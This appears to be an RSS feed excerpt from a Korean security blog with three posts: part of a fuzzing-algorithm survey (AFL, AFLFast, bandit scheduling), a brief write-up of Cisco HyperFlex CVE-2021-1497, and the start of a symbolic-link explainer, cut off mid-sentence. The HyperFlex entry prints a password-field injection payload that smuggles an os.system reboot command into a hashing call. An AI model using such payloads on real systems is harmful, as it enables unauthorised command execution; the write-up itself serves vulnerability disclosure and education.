&#xC131;&#xACF5;&#xB960;&#xC758; &#xCD5C;&#xB300; &#xBC94;&#xC704;(upper-bound)&#xAC00; &#xBCC0;&#xD568;</li></ul></li></ul></li></ol><ol><li><p>&#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; Multi-Armed Banbit(MAB) &#xBB38;&#xC81C;&#xB97C; &#xC870;&#xC0AC;(investigate)&#xD568;</p><p><img src="/2021/10/03/fabu1ous/fuzz-2/8.png" alt></p><p>&#xD314;&#xC774; &#xC5EC;&#xB7EC; &#xAC1C; &#xB2EC;&#xB9B0; &#xAC15;&#xB3C4; &#xBB38;&#xC81C;(MAB)&#xB294; decison science&#xC5D0;&#xC11C; exploration vs exploitation &#xBB38;&#xC81C;&#xB97C; &#xC124;&#xBA85;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xC2AC;&#xB86F;&#xBA38;&#xC2E0;&#xC744; &#xC81C;&#xD55C;&#xB41C; &#xC2DC;&#xAC04; &#xB3D9;&#xC548;&#xB9CC; &#xD50C;&#xB808;&#xC774;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xD55C; &#xBC88;&#xC5D0; &#xD55C;&#xAC1C;&#xC758; &#xC2AC;&#xB86F;&#xBA38;&#xC2E0;&#xB9CC;&#xC744; &#xC791;&#xB3D9;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC73C;&#xBA70;(&#xADF8;&#xB7FC; &#xAD73;&#xC774; &#xD314;&#xC774; &#xC5EC;&#xB7EC; &#xAC1C; &#xB2EC;&#xB824;&#xC788;&#xC744; &#xD544;&#xC694;&#xAC00; &#xC788;&#xB098;?) &#xAC01; &#xC2AC;&#xB86F;&#xBA38;&#xC2E0;&#xB9C8;&#xB2E4; &#xBCF4;&#xC0C1;&#xC774; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; &#xAC15;&#xB3C4;&#xAC00; &#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; &#xC120;&#xD0DD;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBCF4;&#xC0C1;&#xC744; &#xC54C;&#xACE0; &#xC788;&#xB294; &#xC2AC;&#xB86F;&#xBA38;&#xC2E0;&#xC744; &#xB2F9;&#xAE34;&#xB2E4;.</li><li>&#xB2E4;&#xB978; &#xC2AC;&#xB86F;&#xBA38;&#xC2E0;&#xC758; &#xBCF4;&#xC0C1;&#xC744; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</li></ul><p>&#xAC15;&#xB3C4;&#xAC00; &#xC81C;&#xD55C;&#xB41C; &#xC2DC;&#xAC04; &#xB3D9;&#xC548; &#xCD5C;&#xB300; &#xC218;&#xC775;&#xC744; &#xB0B4;&#xAE30; &#xC704;&#xD574; &#xC5B4;&#xB5A4; &#xC21C;&#xC11C;&#xB85C; &#xC5B4;&#xB5A4; &#xADDC;&#xCE59;&#xC73C;&#xB85C; &#xC2AC;&#xB86F;&#xBA38;&#xC2E0;&#xC758; &#xB808;&#xBC84;&#xB97C; &#xB2F9;&#xACA8;&#xC57C; &#xD558;&#xB294;&#xAC00;?</p></li></ol><ol><li>&#xB2E4;&#xB978; &#xC870;&#xAC74;&#xC774; &#xBAA8;&#xB450; &#xB3D9;&#xC77C;&#xD560; &#xB54C; &#xD37C;&#xC9D5; &#xC18D;&#xB3C4;&#xAC00; &#xBE60;&#xB978; configuration&#xC774; unique bug&#xB97C; &#xB354; &#xB9CE;&#xC774; &#xC218;&#xC9D1;&#xD558;&#xACE0;, &#xBBF8;&#xB798;&#xC758; &#xC131;&#xACF5;&#xB960;&#xC5D0; &#xB300;&#xD55C; upper-bound&#xB97C; &#xC904;&#xC774;&#xB294;&#xB370; &#xC88B;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC81C;&#xC2DC;&#xD568;</li></ol><ol><li>&#xD55C; &#xBC88;&#xC758; configuration selection &#xB9C8;&#xB2E4; &#xACE0;&#xC815;&#xB41C; iteration &#xD69F;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xB300;&#xC2E0; &#xC81C;&#xD55C;&#xB41C; &#xC2DC;&#xAC04; &#xB3D9;&#xC548; &#xAC00;&#xB2A5;&#xD55C; &#xB9CC;&#xD07C; iteration&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB3C4;&#xB85D; BFF&#xB97C; &#xBC14;&#xAFD4; &#xB290;&#xB9B0; configuration&#xC5D0; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44;&#xB97C; &#xBC29;&#xC9C0;&#xD568;</li></ol><p>&#xC704; &#xC5F0;&#xAD6C;&#xB97C; &#xD1B5;&#xD574; &#xAE30;&#xC874; BFF&#xC5D0; &#xBE44;&#xD574; &#xB3D9;&#xC77C;&#xD55C; &#xC2DC;&#xAC04; &#xB3D9;&#xC548; &#xC57D; 1.5&#xBC30; &#xB9CE;&#xC740; unique bug&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xAC8C; &#xB428;</p><h2 id="4-3-Grey-box-FCS-Algorithms"><a href="#4-3-Grey-box-FCS-Algorithms" class="headerlink" title="4.3 Grey-box FCS Algorithms"></a>4.3 Grey-box FCS Algorithms</h2><p>Code coverage &#xB4F1; Grey-box&#xC758; FCS &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; black-box&#xC5D0; &#xBE44;&#xD574; &#xC0AC;&#xC6A9;&#xD560; &#xC815;&#xBCF4;&#xC758; &#xC120;&#xD0DD; &#xD3ED;&#xC774; &#xB113;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC9C4;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;(Evolution Algorithm)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; AFL&#xC774; grey-box FCS &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC758; &#xC120;&#xB450;&#xC8FC;&#xC790;&#xC785;&#xB2C8;&#xB2E4;. &#xAC01; configuration&#xB9C8;&#xB2E4; <code>fitness</code>&#xB77C;&#xB294; &#xAC12;&#xC744; &#xAC16;&#xACE0;, &#xC9C4;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC801;&#xC808;&#xD55C; configuartion&#xC744; generic transformation(mutation, recombination)&#xD574;&#xC11C; &#xC790;&#xC2DD;&#xC744; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xC790;&#xC2DD;&#xB4E4; &#xC911; &#xBD80;&#xBAA8;&#xBCF4;&#xB2E4; fit &#xD55C; &#xB188;&#xC774; &#xC788;&#xC744; &#xAC70;&#xB2E4;&#xB77C;&#xB294; &#xAC00;&#xC815;&#xD558;&#xC5D0; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC9C4;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC758; &#xAC1C;&#xB150;&#xC73C;&#xB85C; FCS&#xB97C; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; &#xC544;&#xB798; &#xC9C8;&#xBB38;&#xB4E4;&#xC744; &#xB2F5;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>configuration&#xC774; fit &#xD55C; &#xAE30;&#xC900;&#xC774; &#xBB54;&#xAC00;</li><li>configuration&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xC120;&#xD0DD;&#xD558;&#xB098;</li><li>&#xC120;&#xD0DD;&#xD55C; configuration&#xC73C;&#xB85C; &#xBB34;&#xC5BC; &#xD558;&#xB098;</li></ol><p>high-level&#xC5D0;&#xC11C; &#xC608;&#xC0C1;&#xD574;&#xBCF4;&#xBA74; &#xBE60;&#xB974;&#xACE0; &#xC791;&#xC740; input&#xC744; fit &#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. AFL&#xC740; configuration&#xB4E4;&#xC744; &#xC6D0;&#xD615; queue&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xBA70; &#xB2E4;&#xC74C;&#xC73C;&#xB85C; fit &#xD55C; configuration&#xC744; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xACE0;&#xC815;&#xB41C; &#xD69F;&#xC218;&#xB9CC;&#xD07C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBE60;&#xB978; configuration&#xC744; &#xC120;&#xD638;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC740; black-box FCS&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>AFLFast&#xB294; &#xC544;&#xB798; &#xC138; &#xAC00;&#xC9C0; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xB9CC;&#xB4E4;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC120;&#xD638;&#xD558;&#xB294; input (Favroite input)<ul><li>&#xD2B9;&#xC815; control flow edge&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294; configuration &#xC911; AFLFast&#xB294; &#xC120;&#xD0DD;&#xC744; &#xAC00;&#xC7A5; &#xC801;&#xAC8C; &#xBC1B;&#xC740; configuration&#xC744; &#xC120;&#xD638;&#xD574; exploration &#xC99D;&#xAC00;</li><li>&#xC120;&#xD0DD;&#xBC1B;&#xC740; &#xD69F;&#xC218;&#xAC00; &#xAC19;&#xC740; configuration&#xB4E4;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xAC00;&#xC7A5; &#xC801;&#xAC8C; &#xC2E4;&#xD589;&#xB41C; path&#xB97C; &#xAC16;&#xB294; configuration &#xC120;&#xD638;&#xD574; &#xD76C;&#xADC0; path&#xC758; &#xD0D0;&#xC0C9;&#xC5D0; &#xB300;&#xD55C; exploration &#xC99D;&#xAC00;</li></ul></li><li>round-robin &#xC120;&#xD0DD; &#xBC29;&#xC2DD;&#xC744; &#xBC84;&#xB9AC;&#xACE0; fit configuration&#xC758; &#xC6B0;&#xC120;&#xC21C;&#xC704;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xB2E4;&#xC74C; configuration&#xC744; &#xC120;&#xD0DD;</li><li>power schedule&#xC5D0; &#xC758;&#xD574; &#xC815;&#xD574;&#xC9C4; &#xD69F;&#xC218;&#xB9CC;&#xD07C; &#xC120;&#xD0DD;&#xB41C; configuration&#xC744; &#xC2E4;&#xD589;<ul><li>&#xCC98;&#xC74C;&#xC5D4; &#xC791;&#xC740; &#xAC12;&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD574;&#xC11C; &#xC810;&#xC810; &#xBE60;&#xB974;&#xACE0; &#xD070; &#xD3ED;&#xC73C;&#xB85C; &#xC0C1;&#xC2B9;&#xD558;&#xB294; <code>energy</code>&#xAC12;&#xC744; &#xC0AC;&#xC6A9;</li><li>path&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xB294; input&#xC758; &#xC218;&#xB97C; <code>energy</code> &#xAC12;&#xC73C;&#xB85C; &#xC815;&#xADDC;&#xD654;&#xD574;&#xC11C; &#xC801;&#xAC8C; &#xD37C;&#xC9D5; &#xB41C; configuration&#xC774; &#xC120;&#xD0DD;&#xB418;&#xB3C4;&#xB85D; &#xC7A5;&#xB824;</li></ul></li></ol><p>24&#xC2DC;&#xAC04; &#xD37C;&#xC9D5; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBCF8; &#xACB0;&#xACFC; AFLFast&#xB294; AFL&#xC774; &#xCC3E;&#xC9C0; &#xBABB;&#xD55C; &#xBC84;&#xADF8; 3&#xAC1C;&#xB97C; &#xCC3E;&#xC558;&#xC73C;&#xBA70;, AFL&#xACFC; AFLFast &#xB458;&#xB2E4; &#xCC3E;&#xC740; &#xBC84;&#xADF8;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; AFLFast&#xAC00; &#xC57D; 7&#xBC30;&#xC815;&#xB3C4; &#xB354; &#xBE60;&#xB974;&#xAC8C; &#xCC3E;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;"><a href="#&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;" class="headerlink" title="&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;"></a>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;</h1><p><img src="/2021/10/03/fabu1ous/fuzz-2/9.png" alt></p><p>&#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC120; &#xD37C;&#xC9D5; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC758; &#xC5EC;&#xC12F; &#xB2E8;&#xACC4; &#xC911; &#xCCAB; &#xB450; &#xB2E8;&#xACC4;&#xC778; Preprocess&#xC640; Scheduling&#xB97C; &#xC54C;&#xC544;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xC9C1; &#xAC08; &#xAE38;&#xC774; &#xD55C;&#xCC38; &#xB0A8;&#xC558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; &#xC7A0;&#xC2DC; &#xC26C;&#xC5C8;&#xB2E4;&#xAC00; &#xAC11;&#xC2DC;&#xB2E4;. &#xB2E4;&#xC74C;&#xC5D4; Input Generation&#xACFC; Input Evaluation&#xC744; &#xC54C;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/fuzzer/">fuzzer</category>
      
      <category domain="https://hackyboiz.github.io/tags/servey/">servey</category>
      
      
      <comments>https://hackyboiz.github.io/2021/10/03/fabu1ous/fuzz-2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Cisco Hyperflex: How We Got RCE Through Login Form and Other Findings</title>
      <link>https://hackyboiz.github.io/2021/10/02/j0ker/2021-10-02/</link>
      <guid>https://hackyboiz.github.io/2021/10/02/j0ker/2021-10-02/</guid>
      <pubDate>Sat, 02 Oct 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/cisco-hyperflex-how-we-got-r</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/cisco-hyperflex-how-we-got-rce-through-login-form-and-other-findings/">https://swarm.ptsecurity.com/cisco-hyperflex-how-we-got-rce-through-login-form-and-other-findings/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco Hyperflex</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Cisco HyperFlex&#xC5D0;&#xC11C; 3&#xAC1C;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. HyperFlex&#xB294; &#xC5EC;&#xB7EC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC640; &#xCEF4;&#xD4E8;&#xD305; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xD558;&#xB098;&#xC758; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0; &#xBAA8;&#xC544;&#xB193;&#xACE0; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC785;&#xB2C8;&#xB2E4;. &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CVE-2021-1497 : &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Command Injection &#xCDE8;&#xC57D;&#xC810;(CVSS socre : 9.8)</li><li>CVE-2021-1498 : &#xC694;&#xCCAD; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xCC98;&#xB9AC; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xC758; Command Injection &#xCDE8;&#xC57D;&#xC810;(CVSS socre : 7.3)</li><li>CVE-2021-1499 : path traversal&#xC744; &#xD65C;&#xC6A9;&#xD55C; &#xC784;&#xC758; &#xC704;&#xCE58;&#xC5D0; File Upload &#xCDE8;&#xC57D;&#xC810;(CVSS socre : 5.3)</li></ul><p>&#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xC81C;&#xC77C; &#xC704;&#xD5D8;&#xB3C4;&#xAC00; &#xB192;&#xC740; CVE-2021-1497&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Cisco Hyperflex&#xC5D0;&#xC11C;&#xB294; <code>/opt/springpath/auth/auth</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC778;&#xC99D; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xC694;&#xCCAD; URL&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>/auth</code></li><li><code>/auth/change</code></li><li><code>/auth/logout</code></li><li><code>/auth/verify</code></li><li><code>/auth/sessionInfo</code></li></ul><p>&#xC774; &#xC911; <code>/auth</code>&#xC640; <code>/auth/change</code>&#xB294; &#xC720;&#xC800;&#xB85C;&#xBD80;&#xD130; &#xACC4;&#xC815; &#xC815;&#xBCF4;&#xB97C; &#xBC1B;&#xB294;&#xB370;, &#xC774; &#xB54C; &#xD30C;&#xC774;&#xC36C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD65C;&#xC6A9;&#xD574; &#xACC4;&#xC815; &#xC815;&#xBCF4;&#xB97C; &#xD574;&#xC2DC;&#xD654;&#xD558;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">python <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;import crypt; print(crypt.crypt(\\&quot;</span>OUR_PASS\\<span class="hljs-string">&quot;, \\&quot;</span><span class="hljs-variable">$6</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>\\<span class="hljs-string">&quot;));&quot;</span></code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xD544;&#xB4DC;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xBA74; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC7AC;&#xBD80;&#xD305; &#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-number">123</span><span class="hljs-string">&quot;, &quot;</span><span class="hljs-variable">$6</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-string">&quot;));import os;os.system(&quot;</span>reboot<span class="hljs-string">&quot;);print(crypt.crypt(&quot;</span></code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/command-injection/">command injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/cisco/">cisco</category>
      
      <category domain="https://hackyboiz.github.io/tags/hyperflex/">hyperflex</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2021-1497/">CVE-2021-1497</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2021-1498/">CVE-2021-1498</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2021-1499/">CVE-2021-1499</category>
      
      <category domain="https://hackyboiz.github.io/tags/file-upload/">file upload</category>
      
      
      <comments>https://hackyboiz.github.io/2021/10/02/j0ker/2021-10-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Symbolic Link</title>
      <link>https://hackyboiz.github.io/2021/10/01/poosic/symbolic-link/</link>
      <guid>https://hackyboiz.github.io/2021/10/01/poosic/symbolic-link/</guid>
      <pubDate>Fri, 01 Oct 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2021/10/01/poosic/symbolic-link/image1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC2EC;&amp;#xBCFC;&amp;#xB9AD; &amp;#xB9C1;&amp;#xD06C;(Symbolic Link)&amp;#xB780; &amp;#xC8</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2021/10/01/poosic/symbolic-link/image1.png" alt></p><p>&#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;(Symbolic Link)&#xB780; &#xC808;&#xB300; &#xACBD;&#xB85C; &#xB610;&#xB294; &#xC0C1;&#xB300; &#xACBD;&#xB85C;&#xC758; &#xD615;&#xD0DC;&#xB85C; &#xB41C; &#xB2E4;&#xB978; &#xD30C;&#xC77C;&#xC774;&#xB098; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; <strong>&#xAC00;&#xB9AC;&#xD0A4;&#xB294;</strong> &#xD558;&#xB098;&#xC758; <strong>&#xB3C5;&#xB9BD;&#xC801;&#xC778;</strong> <strong>&#xD30C;&#xC77C;</strong>&#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC2DC; &#xB9D0;&#xD574;&#xC11C;, &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xC774;&#xB098; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xC640; &#xBE44;&#xC2B7;&#xD55C; &#xAC1C;&#xB150;&#xC73C;&#xB85C;&#xB294; Windows&#xC758; &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC65C;-&#xC0AC;&#xC6A9;&#xD560;&#xAE4C;&#xC694;"><a href="#&#xC65C;-&#xC0AC;&#xC6A9;&#xD560;&#xAE4C;&#xC694;" class="headerlink" title="&#xC65C; &#xC0AC;&#xC6A9;&#xD560;&#xAE4C;&#xC694;?"></a>&#xC65C; &#xC0AC;&#xC6A9;&#xD560;&#xAE4C;&#xC694;?</h3><p><img src="/2021/10/01/poosic/symbolic-link/image2.png" alt></p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xC774;&#xC720;&#xB294; <strong>&#xB370;&#xC774;&#xD130; &#xC190;&#xC2E4; &#xBC29;&#xC9C0;</strong>&#xB97C; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xBC14;&#xB85C;&#xAC00;&#xAE30; &#xAE30;&#xB2A5; &#xC5C6;&#xC774; <code>.exe</code> &#xD655;&#xC7A5;&#xC790;&#xC758; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; &#xC9C1;&#xC811; &#xBC14;&#xD0D5;&#xD654;&#xBA74;&#xC5D0; &#xAEBC;&#xB0B4;&#xB193;&#xACE0; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xBC14;&#xD0D5;&#xD654;&#xBA74;&#xC744; &#xC815;&#xB9AC;&#xD55C;&#xB2E4;&#xACE0; &#xBAA8;&#xB974;&#xACE0; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;? &#xD639;&#xC740; &#xD30C;&#xC77C;&#xC744; &#xC5EC;&#xB7EC; &#xBA85;&#xACFC; &#xACF5;&#xC720;&#xD558;&#xB294;&#xB370; &#xB204;&#xAD70;&#xAC00; &#xC0AD;&#xC81C;&#xD574;&#xBC84;&#xB9AC;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;? &#xC774;&#xD6C4; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xB2E4;&#xC2DC; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xAC70;&#xB098; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC2DC; &#xC791;&#xC131;&#xD558;&#xB294; &#xBD88;&#xC0C1;&#xC0AC;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC774;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; &#xD574;&#xB2F9; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC774; &#xC0AD;&#xC81C;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB7EC;&#xD55C; &#xBD88;&#xC0C1;&#xC0AC;&#xB97C; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xC774;&#xC720;&#xB294; <strong>&#xD3B8;&#xB9AC;&#xC131;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C;&#xAC00;&#xAE30; &#xAE30;&#xB2A5;&#xB9CC; &#xBCF4;&#xC544;&#xB3C4; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC774; &#xC124;&#xCE58;&#xB41C; &#xD3F4;&#xB354;&#xAE4C;&#xC9C0; &#xCC3E;&#xC544;&#xAC00;&#xC9C0; &#xC54A;&#xACE0; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCF4;&#xBA74; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xD3B8;&#xB9AC;&#xC131;&#xC744; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB3C4; &#xC774;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC740; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xB9C8;&#xCE58; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xAC00; &#xC9C1;&#xC811; &#xB300;&#xC0C1; &#xD30C;&#xC77C;&#xC5D0; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xB2E4;&#xC591;&#xD558;&#xAC8C; &#xC870;&#xD569;&#xD558;&#xACE0; &#xC870;&#xC791;&#xD558;&#xC5EC; 